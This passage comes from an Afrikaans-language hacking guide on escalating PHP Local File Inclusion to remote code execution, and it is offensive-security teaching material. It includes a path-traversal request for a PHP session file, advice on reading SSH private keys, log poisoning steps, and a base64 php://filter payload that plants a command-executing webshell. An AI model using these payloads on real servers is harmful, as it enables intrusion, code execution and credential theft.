```
Gebruik die LFI om die PHP-sessie lêer in te sluit.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Indien ssh aktief is, kontroleer watter gebruiker gebruik word (/proc/self/status & /etc/passwd) en probeer toegang tot **\<HOME>/.ssh/id\_rsa**

### **Via** **vsftpd** _**logs**_

Die logboeke vir die FTP-bediener vsftpd is geleë by _**/var/log/vsftpd.log**_. In die scenario waar 'n Plaaslike Lêer Insluiting (LFI) kwesbaarheid bestaan, en toegang tot 'n blootgestelde vsftpd-bediener moontlik is, kan die volgende stappe oorweeg word:

1. Spuit 'n PHP-lading in die gebruikersnaamveld tydens die aanmeldingsproses.
2. Na inspuiting, gebruik die LFI om die bedienerlogboeke van _**/var/log/vsftpd.log**_ te herwin.

### Via php base64 filter (gebruik base64)

Soos getoon in [hierdie](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) artikel, ignoreer PHP base64 filter net Nie-base64. Jy kan dit gebruik om die lêeruitbreidingskontrole te omseil: as jy base64 voorsien wat eindig met ".php", sal dit net die "." ignoreer en "php" byvoeg by die base64. Hier is 'n voorbeeldlading:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

Hierdie [**writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) verduidelik dat jy **php filters kan gebruik om arbitrêre inhoud te genereer** as uitset. Dit beteken basies dat jy **arbitrêre php-kode kan genereer** vir die insluiting **sonder om dit in 'n lêer te skryf**.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Via segmentation fault

**Laai** 'n lêer wat as **tydelik** in `/tmp` gestoor sal word, trigger dan 'n **segmenteringsfout** in dieselfde versoek, en dan sal die **tydelike lêer nie verwyder word** nie en jy kan daarnaar soek.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Via Nginx temp file storage

As jy 'n **Local File Inclusion** gevind het en **Nginx** voor PHP hardloop, kan jy moontlik RCE verkry met die volgende tegniek:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Via PHP\_SESSION\_UPLOAD\_PROGRESS

As jy 'n **Local File Inclusion** gevind het selfs al het jy **nie 'n sessie** nie en `session.auto_start` is `Off`. As jy die **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST** data voorsien, sal PHP die sessie **vir jou aktiveer**. Jy kan dit misbruik om RCE te kry:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Via temp file uploads in Windows

As jy 'n **Local File Inclusion** gevind het en die bediener in **Windows** hardloop, kan jy RCE kry:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Via phpinfo() (file\_uploads = on)

As jy 'n **Local File Inclusion** gevind het en 'n lêer wat **phpinfo()** blootstel met file\_uploads = on, kan jy RCE kry:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

As jy 'n **Local File Inclusion** gevind het en jy die pad van die tydelike lêer **kan uitlek** MAAR die **bediener** **toets** of die **lêer wat ingesluit moet word PHP-merke het, kan jy probeer om daardie toets te **vermy** met hierdie **Race Condition**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Via eternal waiting + bruteforce

As jy die LFI kan misbruik om **tydelike lêers te laai** en die bediener die PHP-uitvoering **hang**, kan jy daarna **lange ure lank lêernaam brute force** om die tydelike lêer te vind:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### To Fatal Error

As jy enige van die lêers insluit `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Jy moet dieselfde een 2 keer insluit om daardie fout te veroorsaak).

**Ek weet nie hoe dit nuttig is nie, maar dit kan wees.**\
_Selfs as jy 'n PHP Fatale Fout veroorsaak, word tydelike lêers wat geüpload is deur PHP, verwyder._

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## Verwysings

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om met ervare hackers en foutbeloningsjagters te kommunikeer!

**Hack-insigte**\
Raak betrokke by inhoud wat die opwinding en uitdagings van hack weergee

**Nuus oor Hack in Werklikheid**\
Bly op hoogte van die vinnige hackwêreld deur middel van nuus en insigte in werklikheid

**Nuutste Aankondigings**\
Bly ingelig met die nuutste foutbelonings wat bekendgestel word en kritieke platformopdaterings

**Sluit by ons aan op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!
